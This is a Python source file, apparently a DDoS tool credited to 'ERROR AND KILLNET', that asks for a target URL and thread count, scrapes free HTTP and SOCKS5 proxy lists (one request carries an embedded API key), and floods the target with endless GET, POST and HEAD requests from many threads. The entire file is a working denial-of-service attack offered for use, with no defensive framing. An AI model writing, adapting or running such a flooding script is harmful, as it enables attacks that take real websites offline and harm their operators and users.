print("DDOS BY ERROR AND KILLNET")
from user import users #user - название .py файла (в одной папке с скриптом. users - название твоей переменной с агентами.
import requests
from threading import Thread
import random


headers = {
        'User-Agent' : random.choice(users)
}

url = input("url:")
threads = int(input("Threads: "))
global choice
choice = input('proxy:')


def downloadproxy():
    global proxfile
    if choice == "1":
        proxfile = 'http.txt'
        f = open('http.txt', 'wb+')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",
                             timeout=10)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=10)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=10)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=http&lastchecked=60",
                timeout=10)
            f.write(r.content)
            f.close()
        except:
            f.close()
    if choice == "5":
        proxfile = 'socks5.txt'
        f = open('socks5.txt', 'wb+')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
                             timeout=10)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=10)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=10)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=10)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks5&lastchecked=60",
                timeout=10)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://gist.githubusercontent.com/Azuures/1e0cb7a1097c720b4ed2aa63acd82179/raw/97d2d6a11873ffa8ca763763f7a5dd4035bcf95f/fwefnwex",
                timeout=10)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get(
                "https://top-proxies.ru/free_proxy/downproxyfree.php",
                timeout=10)
            f.write(r.content)
            f.close()
        except:
            print('top-prox')
            f.close()


def send():
        while True:
                s = requests.Session()
                if choice == 5:
                        ff = str(random.choice(open('socks5.txt').readlines()))
                        s.proxies['http'] = 'socks5://'+ ff
                        s.proxies['https'] = 'socks5://' + ff
                if choice == 1:
                        ff = str(random.choice(open('http.txt').readlines()))
                        s.proxies['http'] = 'http://' + ff
                        s.proxies['https'] = 'https://' + ff
                a = s.get(url, headers=headers)
                # print(a)
                print(f'get...    {a}')
                aa = s.post(url, headers=headers, )
                print(aa) ## aa - вывод код запроса. Если 200 - прокси работают. 400 какое-то - не работают. С а тоже самое.s
                print(f'post...     {aa}')
                requests.head(url, headers=headers)
                print("head...")

if __name__ == '__main__':
        downloadproxy()
        #line = random.choice(open(proxfile).readlines())
        for i in range (threads):
                thr = Thread(target=send)
                thr.start()
